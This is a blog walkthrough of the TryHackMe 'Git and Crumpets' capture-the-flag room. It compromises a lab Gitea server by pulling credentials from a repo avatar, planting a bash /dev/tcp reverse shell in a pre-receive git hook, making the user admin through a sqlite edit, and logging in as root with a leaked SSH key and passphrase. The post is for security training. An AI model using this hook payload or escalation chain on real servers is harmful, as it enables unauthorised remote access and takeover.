---
title: TryHackMe Gitandcrumpets
date: 2021-07-04T23:04:02+05:30
lastmod: 2021-07-04T23:04:02+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - gitandcrumpets

draft: false
description: TryHackMe Room Git and Crumpets solved by Animesh Roy. this is a walkthough. read more...

---
## Git and Crumpets

Our devs have been clamoring for some centralized version control, so the admin came through. Rumour has it that they included a few countermeasures...

## Task 01:  Start the VM

---

## Task 02: Git the flags

## user

* I tried running nmap, no luck
  
* being impatatient, I ran a quick curl commnad `curl -s 10.10.x.y` to see what's up. 
  
  ![img](https://i.imgur.com/tpxQmLf.png)

  got this output.

* let's setup **DNS** record, edit `/etc/hosts` file.
  
  ```bash
  cat /etc/hosts
  10.10.x.y   git.git-and-crumpets.thm
  # it should do the work.
  ```

* register a new account

* git clone the repo
  
  * Add git.git-and-crumpets.thm to the file /etc/hosts.
  * Visit http://git.git-and-crumpets.thm/ and register.
  * Explore repos @ http://git.git-and-crumpets.thm/explore/repos.
  * Look at commits of the repo cant-touch-this
  
  ```bash
  git clone http://git.git-and-crumpets.thm/scones/cant-touch-this.git
  # use the creds to authenticate yourself
  ```

* cd to the `repo-dir` run `git log`, it reavels that password is somewhere in "Avatar" a quick `strings` commmand reaveals the password. let's use the creds to login in to `scones` account.
  
  ![img](https://i.imgur.com/WzxHBwh.png)

  let's try loggin in with the email `withcream@example.com` and the password `Password`.

  Create a git hook (http://git.git-and-crumpets.thm/scones/cant-touch-this/settings/hooks/git).
  You can edit the pre-receive to following code, or create your own listener [here](https://shell.anir0y.in)

  * Payload
  
  ```bash
  #!/bin/bash
  bash -i >& /dev/tcp/YOUR_IP/9001 0>&1 #change IP
  ```

  * Start nc listener on our machine

     ```bash
     nc -lvnp 9001
     ```

* Now change the readme file (http://git.git-and-crumpets.thm/scones/cant-touch-this/_edit/master/README.md) and click save. You should get a reverse shell:
  
  ```bash
  nc -lvnp 9001                                                            127 ⨯
  listening on [any] 9001 ...
  connect to [10.17.4.40] from (UNKNOWN) [10.10.219.59] 58472
  bash: cannot set terminal process group (886): Inappropriate ioctl for device
  bash: no job control in this shell
  [git@git-and-crumpets cant-touch-this.git]$ cat /home/git/user.txt #returns base64 encoded flag. decode it 
  ```

  **Decode the flag**

  ```bash
  echo -n "EncodedText==" | base64 -d 
  ```

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## ROOT

* Look at the gitea database, update the current user you have to admin:

     ```bash
     [git@git-and-crumpets tmp]$ sqlite3 /var/lib/gitea/data/gitea.db
     update user set is_admin=1 where id=3;
     #if you didn't upgrade your shell, it might show blank line. don't worry about it
     ```
* Now you can see all repos on the scones account (http://git.git-and-crumpets.thm/admin/repos).

* Go to the backup repo, to the second branch, look at the commits (http://git.git-and-crumpets.thm/root/backup/commits/branch/dotfiles).

* There you will find the openssh key (http://git.git-and-crumpets.thm/root/backup/commit/0b23539d97978fc83b763ef8a4b3882d16e71d32):
  
  ![img](https://i.imgur.com/CSq90PE.png)

* Copy the COntent of SSH key
  
     ```bash
     -----BEGIN OPENSSH PRIVATE KEY-----
     b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCiDnis8h
     K3kgcH6yJEnGngAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQCwF1w1EjRq
     ...[SNIP]...
     f+V62ikG7042lp/fhTYiDgRfvXA=
     -----END OPENSSH PRIVATE KEY-----
     ```

* Copy this key and put it in the file root.key (dont forget chmod):

     ```bash
     vi root.key #paste the key
     chmod 400 root.key #My file name is root.key
     ```

* now login & get the root flag
  
     ```bash
     ssh -i root.key root@10.10.219.59
     The authenticity of host '10.10.219.59 (10.10.219.59)' can't be established.
     ECDSA key fingerprint is SHA256:Tm4zUvVK5KsvOsFB2xvRHK4yg58piyOwURqB1Zr2tXI.
     Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
     Warning: Permanently added '10.10.219.59' (ECDSA) to the list of known hosts.
     Enter passphrase for key 'root.key': #SSH_FILE_NAME {Sup3rS3cur3: is the password}
     [root@git-and-crumpets ~]# cat root.txt 
     encodedFlagData==
     ```

* **Decode the flag**

  ```bash
  echo -n "EncodedText==" | base64 -d 
  ```

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
